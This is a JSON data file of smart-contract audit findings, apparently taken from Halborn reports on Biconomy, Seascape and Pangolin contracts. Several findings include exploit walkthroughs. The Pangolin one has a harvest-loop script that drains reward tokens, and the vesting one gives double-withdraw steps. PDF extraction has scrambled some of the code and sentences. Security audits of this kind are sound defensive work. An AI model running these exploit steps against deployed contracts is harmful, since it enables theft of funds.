        "body": "To protect against cross-function re-entrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdrawal function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against re-entrancy attacks. Code Location: Listing 14: Missing Re-Entrancy Guard 1 function depositFor ( uint256 _fundingKey ) public payable 2 function withdraw ( uint256 _amount ) public onlyOwner Risk Level: Likelihood - 2 Impact - 2 26 Recommendations: DappGasTank.sol In the nonReentrant ReentrancyGuard library to the project and use the nonReentrant modifier to avoid introducing future re-entrancy vulnerabilities. missing OpenZeppelin functions recommended above to contract, modifier. add are is It a Listing 15: nonReentrant Modifier 1 function depositFor ( uint256 _fundingKey ) public nonReentrant payable 2 function withdraw ( uint256 _amount ) public onlyOwner nonReentrant Remediation Plan: SOLVED: pelins ReentrancyGuard. The Biconomy Team solved this issue by implementing OpenZep- Commit ID: 4e2a4ada3f1629b51018dc45c4b9f1af6c2a02c4 27 ",
        "labels": [
            "Halborn",
            "Biconomy_GasTank",
            "Severity: Low"
        ]
    },
    {
        "title": "DEPOSIT FUNCTION DOES NOT CONTROL ALLOWED TOKENS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_GasTank_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the manual code review step, it has seen that allowedToken variable has implemented to the contract to control which token will be allowed to be deposited to the contract. There is also setTokenAllowed method on the contract to enable or disable tokens. Although, the depositFor() method does not check the value of allowedToken variable to decide which token is allowed to be deposited and which is not allowed. Code Location: Listing 16: DappGasTank.sol (Lines 69) 69 mapping ( address => bool ) public allowedTokens ; Listing 17: DappGasTank.sol (Lines 162) 160 function setTokenAllowed ( address token , bool allowed ) external onlyOwner { 161 162 163 164 } require ( token != address (0) , \" Token address cannot be 0 \"); allowedTokens [ token ] = allowed ; emit DepositTokenAdded ( token , msg . sender ); Listing 18: DappGasTank.sol 175 function depositFor ( uint256 _fundingKey ) public payable { 176 require ( msg . sender == tx . origin || msg . sender == _trustedForwarder , \" sender must be EOA or trusted forwarder \" ); 177 require ( msg . value > 0, \" No value provided to depositFor .\" ) ; 28 178 179 180 181 182 183 184 } require ( msg . value >= minDeposit , \" Must be grater than minimum deposit for this network \" ); masterAccount . transfer ( msg . value ); dappBalances [ _fundingKey ] = dappBalances [ _fundingKey ] + msg . value ; // review depositorBalances [ msg . sender ][ _fundingKey ] = depositorBalances [ msg . sender ][ _fundingKey ] + msg . value ; emit Deposit ( msg . sender , msg . value , _fundingKey ); Risk Level: Likelihood - 2 Impact - 1 29 Recommendations: It is suggested to check allowed tokens on depositFor() method. Listing 19: DappGasTank.sol (Lines 175,177) 175 function depositFor ( uint256 _fundingKey , address tokenAddress ) public payable { 176 177 178 179 180 181 182 183 184 185 } require ( msg . sender == tx . origin || msg . sender == _trustedForwarder , \" sender must be EOA or trusted forwarder \" ); require ( allowedTokens [ tokenAddress ], \" This token is not allowed . \"); require ( msg . value > 0, \" No value provided to depositFor .\" ) ; require ( msg . value >= minDeposit , \" Must be grater than minimum deposit for this network \" ); masterAccount . transfer ( msg . value ); dappBalances [ _fundingKey ] = dappBalances [ _fundingKey ] + msg . value ; // review depositorBalances [ msg . sender ][ _fundingKey ] = depositorBalances [ msg . sender ][ _fundingKey ] + msg . value ; emit Deposit ( msg . sender , msg . value , _fundingKey ); Remediation Plan: NOT APPLICABLE: This issue is not applicable in the current version. However, this will be applicable for extended depositFor() method in a future release. 30 ",
        "labels": [
            "Halborn",
            "Biconomy_GasTank",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNUSED PRICE ORACLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_GasTank_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the test, it was determined that a variable on the contract was not used for any purpose, although it was defined on the contract. This situation does not pose any risk in terms of security. But it is important for the readability and applicability of the code. Code Location: Listing 20: DappGasTank.sol (Lines 79) 78 // Pricefeeds info should you require to calculate Token / ETH 79 mapping ( address => address ) public tokenPriceFeed ; Risk Level: Likelihood - 1 Impact - 1 Recommendations: It is recommended to review the unused variables, and to delete it from the contract if it will be remained unused in the future. Remediation Plan: ACKNOWLEDGED: The Biconomy Team acknowledged this issue. 31 3.10 STATIC ANALYSIS REPORT ",
        "labels": [
            "Halborn",
            "Biconomy_GasTank",
            "Severity: Informational"
        ]
    },
    {
        "title": "INVESTOR MULTI",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_MSCP_Token_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The addInvestor function, called only by the owner, does not check if the investor does have claimed already the tokens. The only performed check is the remainingCoins == 0 which will be true after the vesting period finishes (150 days for strategic and 300 days for private). When the vesting period finishes, the owner can call addInvestor, this will reset the remainingCoins for the investor. Having the reset the amount of remaining tokens allows the investor to withdraw again the max amount of tokens. This is possible since the getDuration function will return the total duration (startTime did not change), allowing to re-claim the total tokens again. This process can be repeated. POC:  Add an investor with addInvestor  Wait for the vesting period to finish (150/300 days)  Withdraw the tokens using the investor account  Owner can call again the addInvestor function  Withdraw the tokens again Code Location: Listing 1: contracts/MscpVesting (Lines 51) 50 function addInvestor ( address _investor , bool _strategicInvestor ) external onlyOwner { require ( balances [ _investor ]. remainingCoins == 0 , \" investor already has allocation \" ); if ( _strategicInvestor ){ 51 52 53 11 Figure 1: PoC showing the double withdraw balances [ _investor ]. remainingCoins = TOTAL_STRATEGIC ; balances [ _investor ]. strategicInvestor = true ; } else balances [ _investor ]. remainingCoins = TOTAL_PRIVATE ; emit InvestorModified ( _investor , balances [ _investor ]. remainingCoins ); 54 55 56 57 58 59 60 } Risk Level: Likelihood - 3 Impact - 5 Recommendation: Check if the investor already has claimedBonus tokens. If this value is different from zero, it means that the investor is already vested. 12 Remediation Plan: SOLVED IN THE DEPLOYMENT: The issue will be solved in the deployment implementing a multi-signature wallet. 13 ",
        "labels": [
            "Halborn",
            "Seascape_MSCP_Token_Vesting",
            "Severity: High"
        ]
    },
    {
        "title": "UNUSED CODE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_MSCP_Token_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The burn function on the MscpToken does contain unnecessary code. Code Location: Listing 2: contracts/MscpToken.sol (Lines 97) 96 97 98 function burn ( uint256 amount ) public onlyBridge { require ( false , \" Only burnFrom is allowed \" ); } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to remove the onlyBridge modifier and directly raise Only burnFrom is allowed. Remediation Plan: SOLVED: The code was removed by the Seascape team. 14 MANUAL TESTING 15 4.1 Introduction Halborn performed different manual tests in all the contracts, trying to find logic flaws and vulnerabilities that were not detected by the automatic tools. During the manual testing, multiple questions were considered while evaluating each of the defined functions:  Can it be re-called changing admin/roles and permissions?  Can somehow an external controlled contract call again the function during the execution of it? (Re-entrancy)  Can a function be called twice in the same block causing issues?  Do we control sensitive or vulnerable parameters?  Does the function check for boundaries on the parameters and internal values? Bigger than zero or equal? Argument count, array sizes, integer truncation. . .  Are the function parameters and variables controlled by external contracts?  Can extended contracts cause issues on the extender contract? The following graph, Figure 2, displays the inheritance on both audited contracts. G N I T S E T L A U N A M Figure 2: MscpToken and MscpVesting inheritance graph The Figure 3 and Figure 4 show the call flow present on the contracts. 16 G N I T S E T L A U N A M Figure 3: MscpToken call graph 17 G N I T S E T L A U N A M Figure 4: MscpVesting call graph 18 4.2 Stateful testing The MscpToken was fully verified for being ERC20 compliant before the stateful testing. [[attachments/token_erc20_compliant.png]] The token was tested against stateful testing scripts made to verify current existing token implementations such as OpenZeppelin ERC20 tokens ERC20-PBT The contract was executed against: - StateMachine - MintingStateMachine (since mint functionality exists) The results showed no issues at all. 4.3 Manual checks Both strategic and private should have the same amount at the end of the period. Checking for max withdrawal after the period finished for an strategic account, and a none strategic account (private): G N I T S E T L A U N A M 19 G N I T S E T L A U N A M 20 ",
        "labels": [
            "Halborn",
            "Seascape_MSCP_Token_Vesting",
            "Severity: Informational"
        ]
    },
    {
        "title": "REWARD PERIOD CAN BE EXTENDED INDEFINITELY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract MiniChefV2 the functions fundRewards, extendRewardsViaFunding and extendRewardsViaFunding perform internally the following function call: SUSHI.safeTransfer(address(this), AmountOfTokensToTransfer); This call does not make much sense as it is transferring tokens from the smart contract balance to itself address(this) which allows the following exploitable scenario: 1. Contract MiniChefV2 is deployed. 2. Pool is added by the owner of the contract. 3. Owner of the contract transfer 20e18 SUSHI tokens to the MiniChefV2 contract. 4. Owner of the contract calls minichef.fundRewards(1000000000000000000, 86400, {'from': owner.address}). This means that just 1e18 SUSHI tokens were set as a reward for a total period of 86400 seconds (1 day). Once this reward period is finished and the tokens were harvested by the users, 19e18 SUSHI tokens should still remain in 16 the contract. 5. Attacker calls deposit function, for example depositing 1000 LP tokens into pool id 0. 43200 seconds (12 hours) later. . . 6. Attacker calls harvest and receives 500092592592589392 SUSHI tokens. These tokens are sent through the harvest function: Listing 1: MiniChefV2.sol - function harvest (Lines 331) 320 function harvest ( uint256 pid , address to ) public { PoolInfo memory pool = updatePool ( pid ); 321 UserInfo storage user = userInfo [ pid ][ msg . sender ]; 322 int256 accumulatedSushi = int256 ( user . amount . mul ( pool . 323 accSushiPerShare ) / ACC_SUSHI_PRECISION ); 324 325 326 327 328 329 uint256 _pendingSushi = accumulatedSushi . sub ( user . rewardDebt ). toUInt256 () ; // Effects user . rewardDebt = accumulatedSushi ; // Interactions 17 330 331 332 333 334 335 336 337 338 339 340 } if ( _pendingSushi != 0) { SUSHI . safeTransfer (to , _pendingSushi ); } IRewarder _rewarder = rewarder [ pid ]; if ( address ( _rewarder ) != address (0) ) { _rewarder . onSushiReward ( pid , msg . sender , to , _pendingSushi , user . amount ); } emit Harvest ( msg . sender , pid , _pendingSushi ); And. . . the exploit itself: 7. User1 calls minichef.extendRewardsViaFunding(19499907407407410608, 0, {'from': user1.address}. Note that the amount specified is the total balance of SUSHI reward tokens of the MiniChefV2 contract: This is possible as extendRewardsViaFunding is an external function and has no onlyOwner modifier. It can be called by anyone: Listing 2: 459) MiniChefV2.sol - function extendRewardsViaFunding (Lines 451 function extendRewardsViaFunding ( uint256 funding , uint256 minExtension ) external { require ( funding > 0, \" MiniChefV2 : funding amount cannot be zero \" ); uint256 extensionDuration = funding / sushiPerSecond ; require ( extensionDuration >= minExtension , \" MiniChefV2 : insufficient extension limit \"); rewardsExpiration = rewardsExpiration . add ( extensionDuration ); SUSHI . safeTransfer ( address ( this ) , funding ); emit LogRewardsExpiration ( rewardsExpiration ); 452 453 454 455 456 457 458 459 460 461 462 } 18 8. Right after this call the reward period was extended. As the reward rate is kept, the attacker now can call the harvest function every fixed periods of time until retrieving the 20e18 total reward tokens: Listing 3 1 i = 1 2 while i <=40: 3 4 5 6 7 print (\" Iteration -> \" + str ( i)) output . yelloww (\" Sleeping 43200 seconds ...\") chain . sleep (43200) chain . mine (1) output . yelloww (\" Call -> minichef . harvest (0 , user1 . address , { ' from ': user1 . address }) \") minichef . harvest (0 , user1 . address , { ' from ': user1 . address }) output . redd (\" lptoken1 . balanceOf ( user1 . address ) -> \" + str ( lptoken1 . balanceOf ( user1 . address )) ) output . redd (\" sushi . balanceOf ( user1 . address ) -> \" + str ( sushi . balanceOf ( user1 . address )) ) output . greenn (\" sushi . balanceOf ( minichef . address ) -> \" + str ( sushi . balanceOf ( minichef . address )) ) i= i +1 8 9 10 11 12 ITERATION 1: ITERATION 10: 19 ITERATION 20: ITERATION 30: LAST 3 ITERATIONS: Even if the owner of the contract only funded 1e18 reward tokens the attacker managed to steal the total amount: 20e18. 20 Risk Level: Likelihood - 5 Impact - 5 Recommendation: Halborn recommends adding the onlyOwner modifier to the functions extendRewardsViaFunding and extendRewardsViaDuration. it is recommended to review and update accordingly the functions where SUSHI.safeTransfer is used. Also, Remediation Plan: SOLVED: Pangolin team fixed all the functions by using safeTransferFrom (msg.sender, address(this), funding);. The issue previously was that safeTransfer(address(this), funding); was being used. This call was basically transferring the tokens from the smart contract balance to the smart contract balance which makes no sense. using safeTransferFrom(msg.sender, address(this), funding); By the tokens are now being transferred from the person that calls the function fundRewards, extendRewardsViaFunding and extendRewardsViaFunding to the smart contract as it was intended in the first place. We can see below the code changes performed by Pangolin team which totally corrected this issue. At the left, the old code and at the right, the fixed code: fundRewards: 21 extendRewardsViaFunding and extendRewardsViaFunding: 22 ",
        "labels": [
            "Halborn",
            "Pangolin",
            "Severity: Critical"
        ]
    },
    {
        "title": "INCORRECT LOGIC IN MINICHEFV2 LEADS TO DOS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract MiniChefV2 the function deposit allows any user to deposit LP tokens into a pool. On the other hand, the function fundRewards allows the owner of the contract and the funders to set up some rewards for those users that had deposited tokens into the contract. There is a logic flaw in the updatePool function that causes a partial Denial of Service under the following circumstances: 1. Contract MiniChefV2 is deployed. 2. Pool/pools are added by the owner of the contract. 3. A random user calls deposit function, for example depositing 1000 tokens into pool id 0. 4. Owner tries to call fundRewards function but it reverts (underflow). Proof of Concept: 23 Internally, the function fundRewards performs a SUSHI.safeTransfer and then calls massUpdateAllPools function, which, at the same time, calls updatePool function. After the user1s initial deposit of 1000 tokens, lpSupply variable is higher than 0, entering the if. Since the contract was just deployed and fundRewards was never called, the state variable rewardsExpiration still equals to 0, which means that block.timestamp will always be >= rewardsExpiration. This causes the line rewardsExpiration.sub(pool.lastRewardTime); to be executed. As no uint can be lower than 0, this operation reverts with an underflow. Code Location: Listing 4: MiniChefV2.sol - function updatePool (Lines 261) 254 function updatePool ( uint256 pid ) public returns ( PoolInfo memory 255 256 257 258 259 260 261 262 263 264 265 266 267 pool ) { pool = poolInfo [ pid ]; if ( block . timestamp > pool . lastRewardTime ) { uint256 lpSupply = lpToken [ pid ]. balanceOf ( address ( this )) ; if ( lpSupply > 0) { uint256 time = block . timestamp <= rewardsExpiration ? block . timestamp . sub ( pool . lastRewardTime ) : rewardsExpiration . sub ( pool . lastRewardTime ); uint256 sushiReward = time . mul ( sushiPerSecond ). mul ( pool . allocPoint ) / totalAllocPoint ; pool . accSushiPerShare = pool . accSushiPerShare . add (( sushiReward . mul ( ACC_SUSHI_PRECISION ) / lpSupply ). to128 () ); } pool . lastRewardTime = block . timestamp . to64 () ; poolInfo [ pid ] = pool ; emit PoolUpdate ( pid , pool . lastRewardTime , lpSupply , pool . accSushiPerShare ); 268 269 } } 24 Risk Level: Likelihood - 4 Impact - 4 Recommendation: It is recommended to modify the updatePool function to take into account this edge case. Remediation Plan: SOLVED: Pangolin team solved this issue. This edge case was handled with the following code. At the left, the old code and at the right, the fixed code: We can see, how in the fixed code, the edge case is taken into account. When block.timestamp > rewardsExpiration and rewardsExpiration <= pool. lastRewardTime time will be set to zero avoiding the previous underflow. Below we can see the execution of this edge case and how now is correctly handled: 25 26 ",
        "labels": [
            "Halborn",
            "Pangolin",
            "Severity: High"
        ]
    },
    {
        "title": "LACK OF INTEGER OVERFLOW/UNDERFLOW PROTECTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits, either larger than the maximum or lower than the minimum value. Some of the operations in the contracts are using SafeMath correctly, other operations are not using SafeMath but make use of some of the SafeMath functions and others do not use any kind of SafeMath making the operations vulnerable to overflows and underflows. Code Location: LiquidityPoolManager - Overflow Listing 5: LiquidityPoolManager.sol (Lines 268,278) 245 function calculateReturns () public { 246 require (! readyToDistribute , ' LiquidityPoolManager :: calculateReturns : Previous returns not distributed . Call distributeTokens () '); 247 require ( unallocatedPng > 0, ' LiquidityPoolManager :: calculateReturns : No PNG to allocate . Call vestAllocation () . '); 248 249 250 251 252 253 254 255 if ( pngPairs . length () > 0) { require (!( avaxPngPair == address (0) ) , ' LiquidityPoolManager :: calculateReturns : Avax / PNG Pair not set '); } // Calculate total liquidity distribution = new uint []( numPools ); uint totalLiquidity = 0; 27 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 } // Add liquidity from AVAX pairs for ( uint i = 0; i < avaxPairs . length () ; i ++) { uint pairLiquidity = getAvaxLiquidity ( avaxPairs . at ( i )) ; distribution [i ] = pairLiquidity ; totalLiquidity = SafeMath . add ( totalLiquidity , pairLiquidity ); } // Add liquidity from PNG pairs if ( pngPairs . length () > 0) { uint conversionRatio = getAvaxPngRatio () ; for ( uint i = 0; i < pngPairs . length () ; i ++) { uint pairLiquidity = getPngLiquidity ( pngPairs . at (i ) , conversionRatio ); distribution [ i + avaxPairs . length () ] = pairLiquidity ; totalLiquidity = SafeMath . add ( totalLiquidity , pairLiquidity ); } } // Calculate tokens for each pool uint transferred = 0; for ( uint i = 0; i < distribution . length ; i ++) { uint pairTokens = distribution [ i ]. mul ( unallocatedPng ). div ( totalLiquidity ); distribution [i ] = pairTokens ; transferred = transferred + pairTokens ; } readyToDistribute = true ; LiquidityPoolManager - Underflow 1 Listing 6: LiquidityPoolManager.sol (Lines 296) 287 function distributeTokens () public nonReentrant { 288 require ( readyToDistribute , ' LiquidityPoolManager :: distributeTokens : Previous returns not allocated . Call calculateReturns () '); readyToDistribute = false ; address stakeContract ; uint rewardTokens ; for ( uint i = 0; i < distribution . length ; i ++) { 289 290 291 292 28 293 294 295 296 297 298 299 300 301 302 303 304 305 } if ( i < avaxPairs . length () ) { stakeContract = stakes [ avaxPairs . at ( i ) ]; } else { stakeContract = stakes [ pngPairs . at (i - avaxPairs . length () ) ]; } rewardTokens = distribution [i ]; if ( rewardTokens > 0) { require ( IPNG ( png ). transfer ( stakeContract , rewardTokens ) , ' LiquidityPoolManager :: distributeTokens : Transfer failed '); StakingRewards ( stakeContract ). notifyRewardAmount ( rewardTokens ); } } unallocatedPng = 0; LiquidityPoolManager - Underflow 2 Listing 7: LiquidityPoolManager.sol (Lines 322) 314 function distributeTokensSinglePool ( uint pairIndex ) external 315 316 317 318 319 320 321 322 323 324 325 326 327 328 nonReentrant { require ( readyToDistribute , ' LiquidityPoolManager :: distributeTokensSinglePool : Previous returns not allocated . Call calculateReturns () '); require ( pairIndex < numPools , ' LiquidityPoolManager :: distributeTokensSinglePool : Index out of bounds '); address stakeContract ; if ( pairIndex < avaxPairs . length () ) { stakeContract = stakes [ avaxPairs . at ( pairIndex ) ]; } else { stakeContract = stakes [ pngPairs . at ( pairIndex - avaxPairs . length () ) ]; } uint rewardTokens = distribution [ pairIndex ]; if ( rewardTokens > 0) { distribution [ pairIndex ] = 0; require ( IPNG ( png ). transfer ( stakeContract , rewardTokens ) , ' LiquidityPoolManager :: distributeTokens : Transfer failed 29 '); 329 StakingRewards ( stakeContract ). notifyRewardAmount ( rewardTokens ); 330 331 } }  Same overflows/underflows are also present in LiquidityPoolManagerV2 .sol.  Some mathematical and in TreasuryVester.sol are not making use of SafeMath making them vulnerable as well (see MythX output). MiniChefV2.sol, operations PNG.sol Risk Level: Likelihood - 3 Impact - 3 Recommendation: Currently not all the smart contracts and the operations within them are using the SafeMath library which makes some operations vulnerable to overflows/underflows. In those contracts with Solidity versions <0.8.0 it is recommended to use the SafeMath library for arithmetic operations consistently throughout ALL the mathematical operations in the smart contract system. Reference: Ethereum Smart Contract Best Practices - Integer Overflow and Underflow Remediation Plan: SOLVED: Pangolin team successfully protected the overflow/underflow vulnerable functions. 30 ",
        "labels": [
            "Halborn",
            "Pangolin",
            "Severity: Medium"
        ]
    },
    {
        "title": "FUNCTION MIGRATE MISSING ONLYOWNER MODIFIER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract MiniChefV2.sol the function migrate() allows migrating LP tokens to another LP contract through the migrator contract. Listing 8: MiniChefV2.sol - migrate functions (Lines 189,203,204,205) 188 function setMigrator ( IMigratorChef _migrator ) public onlyOwner { require (! migrationDisabled , \" MiniChefV2 : migration has been 189 disabled \" ); migrator = _migrator ; emit MigratorSet ( address ( _migrator )); 190 191 192 } 193 194 // / @notice Permanently disable the ` migrator ` functionality . 195 // / This can only effectively be called once . 196 function disableMigrator () public onlyOwner { 197 198 199 } 200 201 // / @notice Migrate LP token to another LP contract through the ` migrationDisabled = true ; emit MigratorDisabled () ; migrator ` contract . 202 // / @param _pid The index of the pool . See ` poolInfo `. 203 function migrate ( uint256 _pid ) public { 204 require (! migrationDisabled , \" MiniChefV2 : migration has been disabled \" ); 205 require ( address ( migrator ) != address (0) , \" MiniChefV2 : no migrator set \" ); IERC20 _lpToken = lpToken [ _pid ]; uint256 bal = _lpToken . balanceOf ( address ( this )); _lpToken . approve ( address ( migrator ) , bal ); IERC20 newLpToken = migrator . migrate ( _lpToken ); require ( bal == newLpToken . balanceOf ( address ( this )) , \" MiniChefV2 : migrated balance must match \" ); lpToken [ _pid ] = newLpToken ; emit Migrate ( _pid ); 206 207 208 209 210 211 212 31 213 } As we can see, migrate function can be called by anyone as long as migrationDisabled equals False and migrator address is set. Initially, after the contract deployment, migrationDisabled is already initialized with the value False and the migrator address would equal to address(0). This means that as soon as the function setMigrator is called by the owner of the contract setting the migrator address, anyone would be able to call the migrate function. Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to add the onlyOwner modifier also to the migrate function. Remediation Plan: SOLVED: Pangolin team added the onlyOwner modifier to the migrate function. 32 ",
        "labels": [
            "Halborn",
            "Pangolin",
            "Severity: Medium"
        ]
    },
    {
        "title": "IMPRECISION IN REWARD DISTRIBUTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The contract StakingRewards.sol allows the users that previously had deposited some tokens to withdraw them and claim some PNG tokens as a reward. The function getRewardForDuration() shows how many PNG tokens will be given as a reward. Due to some imprecision in the calculation of the rewards, the users will receive less PNG tokens than the actual amount deserved. For example: Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to define some precision values as constants at the beginning of the contracts and use them in the mathematical operations in order to avoid/reduce the loss of precision. Remediation Plan: RISK ACCEPTED: Pangolin team accepts this risk. 33 ",
        "labels": [
            "Halborn",
            "Pangolin",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Some constructors and functions are missing address validation. Every address should be validated and checked that is different than zero. Code location: Airdrop.sol - constructor(address png_, address uni_, address sushi_, address owner_, address remainderDestination_) - function setRemainderDestination(address remainderDestination_) - function setowner(address owner_) - function whitelistAddress(address addr, uint96 pngOut) - function whitelistAddresses(address[] memory addrs, uint96[] memory pngOuts) CommunityTreasure.sol - constructor(address png_) GovernorAlpha.sol - constructor(address timelock_, address png_, address guardian_) MiniChefV2.sol - constructor(IERC20 _sushi, address _firstOwner) - function deposit(uint256 pid, uint256 amount, address to) - function withdraw(uint256 pid, uint256 amount, address to) - function harvest(uint256 pid, address to) - function withdrawAndHarvest(uint256 pid, uint256 amount, address to) - function emergencyWithdraw(uint256 pid, address to) - function addFunder(address _funder) - function removeFunder(address _funder) 34 PNG.sol - constructor(address account) - function delegate(address delegatee) - function delegateBySig(address delegatee, uint nonce, uint expiry, uint8 v, bytes32 r, bytes32 s) PangolinVoteCalculator.sol - constructor(address _png, address _liquidityManager) - function changeLiquidityPoolManager(address _liquidityManager) RewarderComplex.sol - constructor (IERC20 _rewardToken, uint256 _tokenPerBlock, address _- MASTERCHEF_V2) - function onSushiReward (uint256 pid, address _user, address to, uint256, uint256 lpToken) - function pendingTokens(uint256 pid, address user, uint256) - function pendingToken(uint256 _pid, address _user) RewarderSimple.sol - constructor (uint256 _rewardMultiplier, IERC20 _rewardToken, address _MASTERCHEF_V2) - function onSushiReward (uint256, address user, address to, uint256 sushiAmount, uint256) StakingRewards.sol - constructor - function recoverERC20(address tokenAddress, uint256 tokenAmount) Timelock.sol - constructor(address admin_, uint delay_) - function setPendingAdmin(address pendingAdmin_) - function queueTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) - function cancelTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) - function executeTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) 35 TreasuryVester.sol - constructor(address png_) TreasuryVesterProxy.sol - constructor(address _png, address _treasuryVester, address _treasury, address _chef) Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to validate that every address input is different than zero. Remediation Plan: RISK ACCEPTED: Pangolin team accepts this risk. 36 ",
        "labels": [
            "Halborn",
            "Pangolin",
            "Severity: Low"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Contracts should be deployed with the same compiler version and flags used during development and testing. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma. For example, an outdated pragma version might introduce bugs that affect the contract system negatively or recently released pragma versions may have unknown security vulnerabilities. Code Location: Listing 9 1 TreasuryVesterProxy . sol :1: pragma solidity 0.8.0; 2 StakingRewards . sol :1: pragma solidity ^0.7.6; 3 RewarderComplex . sol :3: pragma solidity 0.6.12; 4 Timelock . sol :1: pragma solidity ^0.5.16; 5 CommunityTreasury . sol :1: pragma solidity ^0.7.6; 6 GovernorAlpha . sol :1: pragma solidity ^0.5.16; 7 LiquidityPoolManagerV2 . sol :1: pragma solidity ^0.7.6; 8 RewarderSimple . sol :3: pragma solidity 0.6.12; 9 PNG . sol :1: pragma solidity ^0.5.16; 10 LiquidityPoolManager . sol :1: pragma solidity ^0.7.6; 11 MiniChefV2 . sol :3: pragma solidity 0.6.12; 12 PangolinVoteCalculator . sol :1: pragma solidity 0.8.0; 13 Airdrop . sol :2: pragma solidity ^0.8.0; 14 TreasuryVester . sol :1: pragma solidity ^0.7.6; Risk Level: Likelihood - 1 Impact - 3 37 Recommendation: It is not recommended to use a Consider locking the pragma version. It is possible to lock the pragma by floating pragma in production. fixing the version both in truffle-config.js for Truffle framework or in hardhat.config.js for HardHat framework. Remediation Plan: SOLVED: The version was locked in the hardhat.config.js file. 38 ",
        "labels": [
            "Halborn",
            "Pangolin",
            "Severity: Low"
        ]
    },
    {
        "title": "DEPRECATED PRAGMA VERSION OF SOLC",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The pragma versions of Solc used by the smart contracts are: - 0.5.16 - 0.6.12 - 0.7.6 - 0.8.0 While the old versions are still functional, and most security issues are mitigated by using other utility contracts such as SafeMath.sol, the risk to the long-term sustainability and integrity of the solidity code increases. Risk Level: Likelihood - 1 Impact - 3 Recommendation: At the time of this audit, the current version is already at 0.8. When possible, use the updated pragma versions to take advantage of new features, for example, after the Solidity version 0.8.0 Arithmetic operations revert on underflow and overflow by default. By using this version, utility contracts like SafeMath.sol would not be needed. Remediation Plan: RISK ACCEPTED: Pangolin team accepts this risk. 39 ",
        "labels": [
            "Halborn",
            "Pangolin",
            "Severity: Low"
        ]
    },
    {
        "title": "EXPERIMENTAL FEATURES ENABLED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The use of experimental features could be dangerous on live deployments. The experimental ABI encoder does not handle non-integer values shorter than 32 bytes properly. This applies to bytesNN types, bool, enum and other types when they are part of an array or a struct and encoded directly from storage. This means these storage references have to be used directly inside abi.encode(. . . ) as arguments in external function calls or in event data without prior assignment to a local variable. Using return does not trigger the bug. The types bytesNN and bool will result in corrupted data while enum might lead to an invalid revert. Furthermore, arrays with elements shorter than 32 bytes may not be handled correctly even if the base type is an integer type. Encoding such arrays in the way described above can lead to other data in the encoding being overwritten if the number of elements encoded is not a multiple of the number of elements that fit a single slot. If nothing follows the array in the encoding (note that dynamically-sized arrays are always encoded after statically-sized arrays with statically-sized content), or if only a single array is encoded, no other data is overwritten. There are known bugs that are publicly released while using this feature. However, the bug only manifests itself when all the following conditions are met: 1. Storage data involving arrays or structs is sent directly to an external function call, to abi.encode or to event data without prior assignment to a local (memory) variable. 2. There is an array that contains elements with size less than 32 bytes or a struct that has elements that share a storage slot or members of type bytesNN shorter than 32 bytes. In addition to that, in the following situations, your code is NOT affected: 40 1. If all the structs or arrays only use uint256 or int256 types. 2. If you only use integer types (that may be shorter) and only encode at most one array at a time. 3. If you only return such data and do not use it in abi.encode, external calls or event data. ABIEncoderV2 is enabled to be able to pass struct type into a function both web3 and another contract. Naturally, any bug can have wildly varying consequences depending on the program control flow, but we expect that this is more likely to lead to malfunction than exploitability. The bug, when triggered, will under certain circumstances send corrupt parameters on method invocations to other contracts. Reference: https://blog.ethereum.org/2019/03/26/solidity-optimizer-and-abiencoderv2-bug/ Code Location: 